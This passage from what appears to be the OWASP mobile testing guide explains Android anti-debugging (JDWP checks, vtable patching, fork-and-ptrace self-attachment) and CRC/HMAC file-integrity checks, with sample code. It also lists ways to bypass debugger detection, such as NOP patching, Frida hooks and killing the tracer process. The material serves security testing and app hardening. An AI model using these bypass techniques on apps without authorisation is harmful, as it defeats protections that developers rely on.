        \KeywordTok{return}\NormalTok{ Debug.}\FunctionTok{isDebuggerConnected}\NormalTok{();}
\NormalTok{    \}}
\end{Highlighting}
\end{Shaded}

The same API can be called via native code by accessing the DvmGlobals
global structure.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{JNIEXPORT jboolean JNICALL Java\_com\_test\_debugging\_DebuggerConnectedJNI(JNIenv * env, jobject obj) \{}
    \ControlFlowTok{if}\NormalTok{ (gDvm.debuggerConnected || gDvm.debuggerActive)}
        \ControlFlowTok{return}\NormalTok{ JNI\_TRUE;}
    \ControlFlowTok{return}\NormalTok{ JNI\_FALSE;}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

\hypertarget{timer-checks}{%
\subparagraph{Timer Checks}\label{timer-checks}}

\texttt{Debug.threadCpuTimeNanos} indicates the amount of time that the
current thread has been executing code. Because debugging slows down
process execution,
\href{https://www.yumpu.com/en/document/read/15228183/android-reverse-engineering-defenses-bluebox-labs}{you
can use the difference in execution time to guess whether a debugger is
attached}.

\begin{Shaded}
\begin{Highlighting}[]
\DataTypeTok{static} \DataTypeTok{boolean} \FunctionTok{detect\_threadCpuTimeNanos}\NormalTok{()\{}
  \DataTypeTok{long}\NormalTok{ start = Debug.}\FunctionTok{threadCpuTimeNanos}\NormalTok{();}

  \KeywordTok{for}\NormalTok{(}\DataTypeTok{int}\NormalTok{ i=}\DecValTok{0}\NormalTok{; i<}\DecValTok{1000000}\NormalTok{; ++i)}
    \KeywordTok{continue}\NormalTok{;}

  \DataTypeTok{long}\NormalTok{ stop = Debug.}\FunctionTok{threadCpuTimeNanos}\NormalTok{();}

  \KeywordTok{if}\NormalTok{(stop {-} start < }\DecValTok{10000000}\NormalTok{) \{}
    \KeywordTok{return} \KeywordTok{false}\NormalTok{;}
\NormalTok{  \}}
  \KeywordTok{else}\NormalTok{ \{}
    \KeywordTok{return} \KeywordTok{true}\NormalTok{;}
\NormalTok{  \}}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

\hypertarget{messing-with-jdwp-related-data-structures}{%
\subparagraph{Messing with JDWP-Related Data
Structures}\label{messing-with-jdwp-related-data-structures}}

In Dalvik, the global virtual machine state is accessible via the
\texttt{DvmGlobals} structure. The global variable gDvm holds a pointer
to this structure. \texttt{DvmGlobals} contains various variables and
pointers that are important for JDWP debugging and can be tampered with.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{struct}\NormalTok{ DvmGlobals \{}
    \CommentTok{/*}
\CommentTok{     * Some options that could be worth tampering with :)}
\CommentTok{     */}

    \DataTypeTok{bool}\NormalTok{        jdwpAllowed;        }\CommentTok{// debugging allowed for this process?}
    \DataTypeTok{bool}\NormalTok{        jdwpConfigured;     }\CommentTok{// has debugging info been provided?}
\NormalTok{    JdwpTransportType jdwpTransport;}
    \DataTypeTok{bool}\NormalTok{        jdwpServer;}
    \DataTypeTok{char}\NormalTok{*       jdwpHost;}
    \DataTypeTok{int}\NormalTok{         jdwpPort;}
    \DataTypeTok{bool}\NormalTok{        jdwpSuspend;}

\NormalTok{    Thread*     threadList;}

    \DataTypeTok{bool}\NormalTok{        nativeDebuggerActive;}
    \DataTypeTok{bool}\NormalTok{        debuggerConnected;      }\CommentTok{/* debugger or DDMS is connected */}
    \DataTypeTok{bool}\NormalTok{        debuggerActive;         }\CommentTok{/* debugger is making requests */}
\NormalTok{    JdwpState*  jdwpState;}

\NormalTok{\};}
\end{Highlighting}
\end{Shaded}

For example,
\href{https://github.com/crazykid95/Backup-Mobile-Security-Report/blob/master/AndroidREnDefenses201305.pdf}{setting
the gDvm.methDalvikDdmcServer\_dispatch function pointer to NULL crashes
the JDWP thread}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{JNIEXPORT jboolean JNICALL Java\_poc\_c\_crashOnInit ( JNIEnv* env , jobject ) \{}
\NormalTok{  gDvm.methDalvikDdmcServer\_dispatch = NULL;}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

You can disable debugging by using similar techniques in ART even though
the gDvm variable is not available. The ART runtime exports some of the
vtables of JDWP-related classes as global symbols (in C++, vtables are
tables that hold pointers to class methods). This includes the vtables
of the classes \texttt{JdwpSocketState} and \texttt{JdwpAdbState}, which
handle JDWP connections via network sockets and ADB, respectively. You
can manipulate the behavior of the debugging runtime
\href{https://www.vantagepoint.sg/blog/88-anti-debugging-fun-with-android-art}{by
overwriting the method pointers in the associated vtables}.

One way to overwrite the method pointers is to overwrite the address of
the function \texttt{jdwpAdbState::ProcessIncoming} with the address of
\texttt{JdwpAdbState::Shutdown}. This will cause the debugger to
disconnect immediately.

\begin{Shaded}
\begin{Highlighting}[]
\PreprocessorTok{\#include }\ImportTok{<jni.h>}
\PreprocessorTok{\#include }\ImportTok{<string>}
\PreprocessorTok{\#include }\ImportTok{<android/log.h>}
\PreprocessorTok{\#include }\ImportTok{<dlfcn.h>}
\PreprocessorTok{\#include }\ImportTok{<sys/mman.h>}
\PreprocessorTok{\#include }\ImportTok{<jdwp/jdwp.h>}

\PreprocessorTok{\#define log(FMT, ...) \_\_android\_log\_print(ANDROID\_LOG\_VERBOSE, "JDWPFun", FMT, \#\#\_\_VA\_ARGS\_\_)}

\CommentTok{// Vtable structure. Just to make messing around with it more intuitive}

\KeywordTok{struct}\NormalTok{ VT\_JdwpAdbState \{}
    \DataTypeTok{unsigned} \DataTypeTok{long}\NormalTok{ x;}
    \DataTypeTok{unsigned} \DataTypeTok{long}\NormalTok{ y;}
    \DataTypeTok{void}\NormalTok{ * JdwpSocketState\_destructor;}
    \DataTypeTok{void}\NormalTok{ * \_JdwpSocketState\_destructor;}
    \DataTypeTok{void}\NormalTok{ * Accept;}
    \DataTypeTok{void}\NormalTok{ * showmanyc;}
    \DataTypeTok{void}\NormalTok{ * ShutDown;}
    \DataTypeTok{void}\NormalTok{ * ProcessIncoming;}
\NormalTok{\};}

\KeywordTok{extern} \StringTok{"C"}

\NormalTok{JNIEXPORT }\DataTypeTok{void}\NormalTok{ JNICALL Java\_sg\_vantagepoint\_jdwptest\_MainActivity\_JDWPfun(}
\NormalTok{        JNIEnv *env,}
\NormalTok{        jobject }\CommentTok{/* this */}\NormalTok{) \{}

    \DataTypeTok{void}\NormalTok{* lib = dlopen(}\StringTok{"libart.so"}\NormalTok{, RTLD\_NOW);}

    \ControlFlowTok{if}\NormalTok{ (lib == NULL) \{}
\NormalTok{        log(}\StringTok{"Error loading libart.so"}\NormalTok{);}
\NormalTok{        dlerror();}
\NormalTok{    \}}\ControlFlowTok{else}\NormalTok{\{}

        \KeywordTok{struct}\NormalTok{ VT\_JdwpAdbState *vtable = ( }\KeywordTok{struct}\NormalTok{ VT\_JdwpAdbState *)dlsym(lib, }\StringTok{"\_ZTVN3art4JDWP12JdwpAdbStateE"}\NormalTok{);}

        \ControlFlowTok{if}\NormalTok{ (vtable == }\DecValTok{0}\NormalTok{) \{}
\NormalTok{            log(}\StringTok{"Couldn\textquotesingle{}t resolve symbol \textquotesingle{}\_ZTVN3art4JDWP12JdwpAdbStateE\textquotesingle{}.}\SpecialCharTok{\textbackslash{}n}\StringTok{"}\NormalTok{);}
\NormalTok{        \}}\ControlFlowTok{else}\NormalTok{ \{}

\NormalTok{            log(}\StringTok{"Vtable for JdwpAdbState at: \%08x}\SpecialCharTok{\textbackslash{}n}\StringTok{"}\NormalTok{, vtable);}

            \CommentTok{// Let the fun begin!}

            \DataTypeTok{unsigned} \DataTypeTok{long}\NormalTok{ pagesize = sysconf(\_SC\_PAGE\_SIZE);}
            \DataTypeTok{unsigned} \DataTypeTok{long}\NormalTok{ page = (}\DataTypeTok{unsigned} \DataTypeTok{long}\NormalTok{)vtable \& \textasciitilde{}(pagesize{-}}\DecValTok{1}\NormalTok{);}

\NormalTok{            mprotect((}\DataTypeTok{void}\NormalTok{ *)page, pagesize, PROT\_READ | PROT\_WRITE);}

\NormalTok{            vtable{-}>ProcessIncoming = vtable{-}>ShutDown;}

            \CommentTok{// Reset permissions \& flush cache}

\NormalTok{            mprotect((}\DataTypeTok{void}\NormalTok{ *)page, pagesize, PROT\_READ);}

\NormalTok{        \}}
\NormalTok{    \}}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

\hypertarget{traditional-anti-debugging}{%
\paragraph{Traditional
Anti-Debugging}\label{traditional-anti-debugging}}

On Linux, the
\href{http://man7.org/linux/man-pages/man2/ptrace.2.html}{\texttt{ptrace}
system call} is used to observe and control the execution of a process
(the \emph{tracee}) and to examine and change that process' memory and
registers. \texttt{ptrace} is the primary way to implement system call
tracing and breakpoint debugging in native code. Most JDWP
anti-debugging tricks (which may be safe for timer-based checks) won't
catch classical debuggers based on \texttt{ptrace} and therefore, many
Android anti-debugging tricks include \texttt{ptrace}, often exploiting
the fact that only one debugger at a time can attach to a process.

\hypertarget{checking-tracerpid}{%
\subparagraph{Checking TracerPid}\label{checking-tracerpid}}

When you debug an app and set a breakpoint on native code, Android
Studio will copy the needed files to the target device and start the
lldb-server which will use \texttt{ptrace} to attach to the process.
From this moment on, if you inspect the
\href{http://man7.org/linux/man-pages/man5/proc.5.html}{status file} of
the debugged process (\texttt{/proc/\textless{}pid\textgreater{}/status}
or \texttt{/proc/self/status}), you will see that the ``TracerPid''
field has a value different from 0, which is a sign of debugging.

\begin{quote}
Remember that \textbf{this only applies to native code}. If you're
debugging a Java/Kotlin-only app the value of the ``TracerPid'' field
should be 0.
\end{quote}

This technique is usually applied within the JNI native libraries in C,
as shown in
\href{https://github.com/gperftools/gperftools/blob/master/src/heap-checker.cc\#L112}{Google's
gperftools (Google Performance Tools)) Heap Checker} implementation of
the \texttt{IsDebuggerAttached} method. However, if you prefer to
include this check as part of your Java/Kotlin code you can refer to
this Java implementation of the \texttt{hasTracerPid} method from
\href{https://github.com/strazzere/anti-emulator/}{Tim Strazzere's
Anti-Emulator project}.

When trying to implement such a method yourself, you can manually check
the value of TracerPid with ADB. The following listing uses Google's NDK
sample app
\href{https://github.com/android/ndk-samples/tree/android-mk/hello-jni}{hello-jni
(com.example.hellojni)} to perform the check after attaching Android
Studio's debugger:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{adb}\NormalTok{ shell ps {-}A }\KeywordTok{|} \FunctionTok{grep}\NormalTok{ com.example.hellojni}
\ExtensionTok{u0\_a271}\NormalTok{      11657   573 4302108  50600 ptrace\_stop         0 t com.example.hellojni}
\NormalTok{$ }\ExtensionTok{adb}\NormalTok{ shell cat /proc/11657/status }\KeywordTok{|} \FunctionTok{grep}\NormalTok{ {-}e }\StringTok{"\^{}TracerPid:"} \KeywordTok{|} \FunctionTok{sed} \StringTok{"s/\^{}TracerPid:\textbackslash{}t//"}
\ExtensionTok{TracerPid}\NormalTok{:      11839}
\NormalTok{$ }\ExtensionTok{adb}\NormalTok{ shell ps {-}A }\KeywordTok{|} \FunctionTok{grep}\NormalTok{ 11839}
\ExtensionTok{u0\_a271}\NormalTok{      11839 11837   14024   4548 poll\_schedule\_timeout 0 S lldb{-}server}
\end{Highlighting}
\end{Shaded}

You can see how the status file of com.example.hellojni (PID=11657)
contains a TracerPID of 11839, which we can identify as the lldb-server
process.

\hypertarget{using-fork-and-ptrace}{%
\subparagraph{Using Fork and ptrace}\label{using-fork-and-ptrace}}

You can prevent debugging of a process by forking a child process and
attaching it to the parent as a debugger via code similar to the
following simple example code:

\begin{Shaded}
\begin{Highlighting}[]
\DataTypeTok{void}\NormalTok{ fork\_and\_attach()}
\NormalTok{\{}
  \DataTypeTok{int}\NormalTok{ pid = fork();}

  \ControlFlowTok{if}\NormalTok{ (pid == }\DecValTok{0}\NormalTok{)}
\NormalTok{    \{}
      \DataTypeTok{int}\NormalTok{ ppid = getppid();}

      \ControlFlowTok{if}\NormalTok{ (ptrace(PTRACE\_ATTACH, ppid, NULL, NULL) == }\DecValTok{0}\NormalTok{)}
\NormalTok{        \{}
\NormalTok{          waitpid(ppid, NULL, }\DecValTok{0}\NormalTok{);}

          \CommentTok{/* Continue the parent process */}
\NormalTok{          ptrace(PTRACE\_CONT, NULL, NULL);}
\NormalTok{        \}}
\NormalTok{    \}}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

With the child attached, further attempts to attach to the parent will
fail. We can verify this by compiling the code into a JNI function and
packing it into an app we run on the device.

\begin{verbatim}
root@android:/ # ps | grep -i anti
u0_a151   18190 201   1535844 54908 ffffffff b6e0f124 S sg.vantagepoint.antidebug
u0_a151   18224 18190 1495180 35824 c019a3ac b6e0ee5c S sg.vantagepoint.antidebug
\end{verbatim}

Attempting to attach to the parent process with gdbserver fails with an
error:

\begin{verbatim}
root@android:/ # ./gdbserver --attach localhost:12345 18190
warning: process 18190 is already traced by process 18224
Cannot attach to lwp 18190: Operation not permitted (1)
Exiting
\end{verbatim}

You can easily bypass this failure, however, by killing the child and
``freeing'' the parent from being traced. You'll therefore usually find
more elaborate schemes, involving multiple processes and threads as well
as some form of monitoring to impede tampering. Common methods include

\begin{itemize}
\tightlist
\item
  forking multiple processes that trace one another,
\item
  keeping track of running processes to make sure the children stay
  alive,
\item
  monitoring values in the \texttt{/proc} filesystem, such as TracerPID
  in \texttt{/proc/pid/status}.
\end{itemize}

Let's look at a simple improvement for the method above. After the
initial \texttt{fork}, we launch in the parent an extra thread that
continually monitors the child's status. Depending on whether the app
has been built in debug or release mode (which is indicated by the
\texttt{android:debuggable} flag in the manifest), the child process
should do one of the following things:

\begin{itemize}
\tightlist
\item
  In release mode: The call to ptrace fails and the child crashes
  immediately with a segmentation fault (exit code 11).
\item
  In debug mode: The call to ptrace works and the child should run
  indefinitely. Consequently, a call to \texttt{waitpid(child\_pid)}
  should never return. If it does, something is fishy and we would kill
  the whole process group.
\end{itemize}

The following is the complete code for implementing this improvement
with a JNI function:

\begin{Shaded}
\begin{Highlighting}[]
\PreprocessorTok{\#include }\ImportTok{<jni.h>}
\PreprocessorTok{\#include }\ImportTok{<unistd.h>}
\PreprocessorTok{\#include }\ImportTok{<sys/ptrace.h>}
\PreprocessorTok{\#include }\ImportTok{<sys/wait.h>}
\PreprocessorTok{\#include }\ImportTok{<pthread.h>}

\DataTypeTok{static} \DataTypeTok{int}\NormalTok{ child\_pid;}

\DataTypeTok{void}\NormalTok{ *monitor\_pid() \{}

    \DataTypeTok{int}\NormalTok{ status;}

\NormalTok{    waitpid(child\_pid, \&status, }\DecValTok{0}\NormalTok{);}

    \CommentTok{/* Child status should never change. */}

\NormalTok{    \_exit(}\DecValTok{0}\NormalTok{); }\CommentTok{// Commit seppuku}

\NormalTok{\}}

\DataTypeTok{void}\NormalTok{ anti\_debug() \{}

\NormalTok{    child\_pid = fork();}

    \ControlFlowTok{if}\NormalTok{ (child\_pid == }\DecValTok{0}\NormalTok{)}
\NormalTok{    \{}
        \DataTypeTok{int}\NormalTok{ ppid = getppid();}
        \DataTypeTok{int}\NormalTok{ status;}

        \ControlFlowTok{if}\NormalTok{ (ptrace(PTRACE\_ATTACH, ppid, NULL, NULL) == }\DecValTok{0}\NormalTok{)}
\NormalTok{        \{}
\NormalTok{            waitpid(ppid, \&status, }\DecValTok{0}\NormalTok{);}

\NormalTok{            ptrace(PTRACE\_CONT, ppid, NULL, NULL);}

            \ControlFlowTok{while}\NormalTok{ (waitpid(ppid, \&status, }\DecValTok{0}\NormalTok{)) \{}

                \ControlFlowTok{if}\NormalTok{ (WIFSTOPPED(status)) \{}
\NormalTok{                    ptrace(PTRACE\_CONT, ppid, NULL, NULL);}
\NormalTok{                \} }\ControlFlowTok{else}\NormalTok{ \{}
                    \CommentTok{// Process has exited}
\NormalTok{                    \_exit(}\DecValTok{0}\NormalTok{);}
\NormalTok{                \}}
\NormalTok{            \}}
\NormalTok{        \}}

\NormalTok{    \} }\ControlFlowTok{else}\NormalTok{ \{}
\NormalTok{        pthread\_t t;}

        \CommentTok{/* Start the monitoring thread */}
\NormalTok{        pthread\_create(\&t, NULL, monitor\_pid, (}\DataTypeTok{void}\NormalTok{ *)NULL);}
\NormalTok{    \}}
\NormalTok{\}}

\NormalTok{JNIEXPORT }\DataTypeTok{void}\NormalTok{ JNICALL}
\NormalTok{Java\_sg\_vantagepoint\_antidebug\_MainActivity\_antidebug(JNIEnv *env, jobject instance) \{}

\NormalTok{    anti\_debug();}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

Again, we pack this into an Android app to see if it works. Just as
before, two processes show up when we run the app's debug build.

\begin{verbatim}
root@android:/ # ps | grep -I anti-debug
u0_a152   20267 201   1552508 56796 ffffffff b6e0f124 S sg.vantagepoint.anti-debug
u0_a152   20301 20267 1495192 33980 c019a3ac b6e0ee5c S sg.vantagepoint.anti-debug
\end{verbatim}

However, if we terminate the child process at this point, the parent
exits as well:

\begin{verbatim}
root@android:/ # kill -9 20301
130|root@hammerhead:/ # cd /data/local/tmp
root@android:/ # ./gdbserver --attach localhost:12345 20267
gdbserver: unable to open /proc file '/proc/20267/status'
Cannot attach to lwp 20267: No such file or directory (2)
Exiting
\end{verbatim}

To bypass this, we must modify the app's behavior slightly (the easiest
ways to do so are patching the call to \texttt{\_exit} with NOPs and
hooking the function \texttt{\_exit} in \texttt{libc.so}). At this
point, we have entered the proverbial ``arms race'': implementing more
intricate forms of this defense as well as bypassing it are always
possible.

\hypertarget{bypassing-debugger-detection}{%
\paragraph{Bypassing Debugger
Detection}\label{bypassing-debugger-detection}}

There's no generic way to bypass anti-debugging: the best method depends
on the particular mechanism(s) used to prevent or detect debugging and
the other defenses in the overall protection scheme. For example, if
there are no integrity checks or you've already deactivated them,
patching the app might be the easiest method. In other cases, a hooking
framework or kernel modules might be preferable. The following methods
describe different approaches to bypass debugger detection:

\begin{itemize}
\tightlist
\item
  Patching the anti-debugging functionality: Disable the unwanted
  behavior by simply overwriting it with NOP instructions. Note that
  more complex patches may be required if the anti-debugging mechanism
  is well designed.
\item
  Using Frida or Xposed to hook APIs on the Java and native layers:
  manipulate the return values of functions such as
  \texttt{isDebuggable} and \texttt{isDebuggerConnected} to hide the
  debugger.
\item
  Changing the environment: Android is an open environment. If nothing
  else works, you can modify the operating system to subvert the
  assumptions the developers made when designing the anti-debugging
  tricks.
\end{itemize}

\hypertarget{bypassing-example-uncrackable-app-for-android-level-2}{%
\subparagraph{Bypassing Example: UnCrackable App for Android Level
2}\label{bypassing-example-uncrackable-app-for-android-level-2}}

When dealing with obfuscated apps, you'll often find that developers
purposely ``hide away'' data and functionality in native libraries.
You'll find an example of this in level 2 of the ``UnCrackable App for
Android''.

At first glance, the code looks like the prior challenge. A class called
\texttt{CodeCheck} is responsible for verifying the code entered by the
user. The actual check appears to occur in the \texttt{bar} method,
which is declared as a \emph{native} method.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{package}\ImportTok{ sg.vantagepoint.uncrackable2;}

\KeywordTok{public} \KeywordTok{class}\NormalTok{ CodeCheck \{}
    \KeywordTok{public} \FunctionTok{CodeCheck}\NormalTok{() \{}
        \KeywordTok{super}\NormalTok{();}
\NormalTok{    \}}

    \KeywordTok{public} \DataTypeTok{boolean} \FunctionTok{a}\NormalTok{(}\BuiltInTok{String}\NormalTok{ arg2) \{}
        \KeywordTok{return} \KeywordTok{this}\NormalTok{.}\FunctionTok{bar}\NormalTok{(arg2.}\FunctionTok{getBytes}\NormalTok{());}
\NormalTok{    \}}

    \KeywordTok{private} \KeywordTok{native} \DataTypeTok{boolean} \FunctionTok{bar}\NormalTok{(}\DataTypeTok{byte}\NormalTok{[] arg1) \{}
\NormalTok{    \}}
\NormalTok{\}}

    \DataTypeTok{static}\NormalTok{ \{}
        \BuiltInTok{System}\NormalTok{.}\FunctionTok{loadLibrary}\NormalTok{(}\StringTok{"foo"}\NormalTok{);}
\NormalTok{    \}}
\end{Highlighting}
\end{Shaded}

Please see
\href{https://github.com/OWASP/owasp-mstg/tree/master/Crackmes\#uncrackable-app-for-android-level-2}{different
proposed solutions for the Android Crackme Level 2} in GitHub.

\hypertarget{effectiveness-assessment-1}{%
\paragraph{Effectiveness Assessment}\label{effectiveness-assessment-1}}

Check for anti-debugging mechanisms, including the following criteria:

\begin{itemize}
\tightlist
\item
  Attaching jdb and ptrace-based debuggers fails or causes the app to
  terminate or malfunction.
\item
  Multiple detection methods are scattered throughout the app's source
  code (as opposed to their all being in a single method or function).
\item
  The anti-debugging defenses operate on multiple API layers (Java,
  native library functions, assembler/system calls).
\item
  The mechanisms are somehow original (as opposed to being copied and
  pasted from StackOverflow or other sources).
\end{itemize}

Work on bypassing the anti-debugging defenses and answer the following
questions:

\begin{itemize}
\tightlist
\item
  Can the mechanisms be bypassed trivially (e.g., by hooking a single
  API function)?
\item
  How difficult is identifying the anti-debugging code via static and
  dynamic analysis?
\item
  Did you need to write custom code to disable the defenses? How much
  time did you need?
\item
  What is your subjective assessment of the difficulty of bypassing the
  mechanisms?
\end{itemize}

If anti-debugging mechanisms are missing or too easily bypassed, make
suggestions in line with the effectiveness criteria above. These
suggestions may include adding more detection mechanisms and better
integration of existing mechanisms with other defenses.

\hypertarget{testing-file-integrity-checks-mstg-resilience-3}{%
\subsubsection{Testing File Integrity Checks
(MSTG-RESILIENCE-3)}\label{testing-file-integrity-checks-mstg-resilience-3}}

\hypertarget{overview-43}{%
\paragraph{Overview}\label{overview-43}}

There are two topics related to file integrity:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \emph{Code integrity checks:} In the ``Tampering and Reverse
  Engineering'' chapter, we discussed Android's APK code signature
  check. We also saw that determined reverse engineers can easily bypass
  this check by re-packaging and re-signing an app. To make this
  bypassing process more involved, a protection scheme can be augmented
  with CRC checks on the app byte-code, native libraries, and important
  data files. These checks can be implemented on both the Java and the
  native layer. The idea is to have additional controls in place so that
  the app only runs correctly in its unmodified state, even if the code
  signature is valid.
\item
  \emph{The file storage integrity checks:} The integrity of files that
  the application stores on the SD card or public storage and the
  integrity of key-value pairs that are stored in
  \texttt{SharedPreferences} should be protected.
\end{enumerate}

\hypertarget{sample-implementation---application-source-code}{%
\subparagraph{Sample Implementation - Application Source
Code}\label{sample-implementation---application-source-code}}

Integrity checks often calculate a checksum or hash over selected files.
Commonly protected files include

\begin{itemize}
\tightlist
\item
  AndroidManifest.xml,
\item
  class files *.dex,
\item
  native libraries (*.so).
\end{itemize}

The following
\href{https://androidcracking.blogspot.com/2011/06/anti-tampering-with-crc-check.html}{sample
implementation from the Android Cracking blog} calculates a CRC over
\texttt{classes.dex} and compares it to the expected value.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{private} \DataTypeTok{void} \FunctionTok{crcTest}\NormalTok{() }\KeywordTok{throws} \BuiltInTok{IOException}\NormalTok{ \{}
 \DataTypeTok{boolean}\NormalTok{ modified = }\KeywordTok{false}\NormalTok{;}
 \CommentTok{// required dex crc value stored as a text string.}
 \CommentTok{// it could be any invisible layout element}
 \DataTypeTok{long}\NormalTok{ dexCrc = }\BuiltInTok{Long}\NormalTok{.}\FunctionTok{parseLong}\NormalTok{(Main.}\FunctionTok{MyContext}\NormalTok{.}\FunctionTok{getString}\NormalTok{(R.}\FunctionTok{string}\NormalTok{.}\FunctionTok{dex\_crc}\NormalTok{));}

 \BuiltInTok{ZipFile}\NormalTok{ zf = }\KeywordTok{new} \BuiltInTok{ZipFile}\NormalTok{(Main.}\FunctionTok{MyContext}\NormalTok{.}\FunctionTok{getPackageCodePath}\NormalTok{());}
 \BuiltInTok{ZipEntry}\NormalTok{ ze = zf.}\FunctionTok{getEntry}\NormalTok{(}\StringTok{"classes.dex"}\NormalTok{);}

 \KeywordTok{if}\NormalTok{ ( ze.}\FunctionTok{getCrc}\NormalTok{() != dexCrc ) \{}
  \CommentTok{// dex has been modified}
\NormalTok{  modified = }\KeywordTok{true}\NormalTok{;}
\NormalTok{ \}}
 \KeywordTok{else}\NormalTok{ \{}
  \CommentTok{// dex not tampered with}
\NormalTok{  modified = }\KeywordTok{false}\NormalTok{;}
\NormalTok{ \}}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

\hypertarget{sample-implementation---storage}{%
\subparagraph{Sample Implementation -
Storage}\label{sample-implementation---storage}}

When providing integrity on the storage itself, you can either create an
HMAC over a given key-value pair (as for the Android
\texttt{SharedPreferences}) or create an HMAC over a complete file
that's provided by the file system.

When using an HMAC, you can
\href{https://cseweb.ucsd.edu/~mihir/papers/oem.html}{use a bouncy
castle implementation or the AndroidKeyStore to HMAC the given content}.

Complete the following procedure when generating an HMAC with
BouncyCastle:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Make sure BouncyCastle or SpongyCastle is registered as a security
  provider.
\item
  Initialize the HMAC with a key (which can be stored in a keystore).
\item
  Get the byte array of the content that needs an HMAC.
\item
  Call \texttt{doFinal} on the HMAC with the byte-code.
\item
  Append the HMAC to the bytearray obtained in step 3.
\item
  Store the result of step 5.
\end{enumerate}

Complete the following procedure when verifying the HMAC with
BouncyCastle:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Make sure that BouncyCastle or SpongyCastle is registered as a
  security provider.
\item
  Extract the message and the HMAC-bytes as separate arrays.
\item
  Repeat steps 1-4 of the procedure for generating an HMAC.
\item
  Compare the extracted HMAC-bytes to the result of step 3.
\end{enumerate}

When generating the HMAC based on the
\href{https://developer.android.com/training/articles/keystore.html}{Android
Keystore}, then it is best to only do this for Android 6.0 (API level
23) and higher.

The following is a convenient HMAC implementation without
\texttt{AndroidKeyStore}:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{public} \KeywordTok{enum}\NormalTok{ HMACWrapper \{}
    \FunctionTok{HMAC\_512}\NormalTok{(}\StringTok{"HMac{-}SHA512"}\NormalTok{), }\CommentTok{//please note that this is the spec for the BC provider}
    \FunctionTok{HMAC\_256}\NormalTok{(}\StringTok{"HMac{-}SHA256"}\NormalTok{);}

    \KeywordTok{private} \DataTypeTok{final} \BuiltInTok{String}\NormalTok{ algorithm;}

    \KeywordTok{private} \FunctionTok{HMACWrapper}\NormalTok{(}\DataTypeTok{final} \BuiltInTok{String}\NormalTok{ algorithm) \{}
        \KeywordTok{this}\NormalTok{.}\FunctionTok{algorithm}\NormalTok{ = algorithm;}
\NormalTok{    \}}

    \KeywordTok{public} \BuiltInTok{Mac} \FunctionTok{createHMAC}\NormalTok{(}\DataTypeTok{final} \BuiltInTok{SecretKey}\NormalTok{ key) \{}
        \KeywordTok{try}\NormalTok{ \{}
            \BuiltInTok{Mac}\NormalTok{ e = }\BuiltInTok{Mac}\NormalTok{.}\FunctionTok{getInstance}\NormalTok{(}\KeywordTok{this}\NormalTok{.}\FunctionTok{algorithm}\NormalTok{, }\StringTok{"BC"}\NormalTok{);}
            \BuiltInTok{SecretKeySpec}\NormalTok{ secret = }\KeywordTok{new} \BuiltInTok{SecretKeySpec}\NormalTok{(key.}\FunctionTok{getKey}\NormalTok{().}\FunctionTok{getEncoded}\NormalTok{(), }\KeywordTok{this}\NormalTok{.}\FunctionTok{algorithm}\NormalTok{);}
\NormalTok{            e.}\FunctionTok{init}\NormalTok{(secret);}
            \KeywordTok{return}\NormalTok{ e;}
\NormalTok{        \} }\KeywordTok{catch}\NormalTok{ (}\BuiltInTok{NoSuchProviderException}\NormalTok{ | }\BuiltInTok{InvalidKeyException}\NormalTok{ | }\BuiltInTok{NoSuchAlgorithmException}\NormalTok{ e) \{}
            \CommentTok{//handle them}
\NormalTok{        \}}
\NormalTok{    \}}

    \KeywordTok{public} \DataTypeTok{byte}\NormalTok{[] }\FunctionTok{hmac}\NormalTok{(}\DataTypeTok{byte}\NormalTok{[] message, }\BuiltInTok{SecretKey}\NormalTok{ key) \{}
        \BuiltInTok{Mac}\NormalTok{ mac = }\KeywordTok{this}\NormalTok{.}\FunctionTok{createHMAC}\NormalTok{(key);}
        \KeywordTok{return}\NormalTok{ mac.}\FunctionTok{doFinal}\NormalTok{(message);}
\NormalTok{    \}}

    \KeywordTok{public} \DataTypeTok{boolean} \FunctionTok{verify}\NormalTok{(}\DataTypeTok{byte}\NormalTok{[] messageWithHMAC, }\BuiltInTok{SecretKey}\NormalTok{ key) \{}
        \BuiltInTok{Mac}\NormalTok{ mac = }\KeywordTok{this}\NormalTok{.}\FunctionTok{createHMAC}\NormalTok{(key);}
        \DataTypeTok{byte}\NormalTok{[] checksum = }\FunctionTok{extractChecksum}\NormalTok{(messageWithHMAC, mac.}\FunctionTok{getMacLength}\NormalTok{());}
        \DataTypeTok{byte}\NormalTok{[] message = }\FunctionTok{extractMessage}\NormalTok{(messageWithHMAC, mac.}\FunctionTok{getMacLength}\NormalTok{());}
        \DataTypeTok{byte}\NormalTok{[] calculatedChecksum = }\KeywordTok{this}\NormalTok{.}\FunctionTok{hmac}\NormalTok{(message, key);}
        \DataTypeTok{int}\NormalTok{ diff = checksum.}\FunctionTok{length}\NormalTok{ \^{} calculatedChecksum.}\FunctionTok{length}\NormalTok{;}

        \KeywordTok{for}\NormalTok{ (}\DataTypeTok{int}\NormalTok{ i = }\DecValTok{0}\NormalTok{; i < checksum.}\FunctionTok{length}\NormalTok{ \&\& i < calculatedChecksum.}\FunctionTok{length}\NormalTok{; ++i) \{}
\NormalTok{            diff |= checksum[i] \^{} calculatedChecksum[i];}
\NormalTok{        \}}

        \KeywordTok{return}\NormalTok{ diff == }\DecValTok{0}\NormalTok{;}
\NormalTok{    \}}

    \KeywordTok{public} \DataTypeTok{byte}\NormalTok{[] }\FunctionTok{extractMessage}\NormalTok{(}\DataTypeTok{byte}\NormalTok{[] messageWithHMAC) \{}
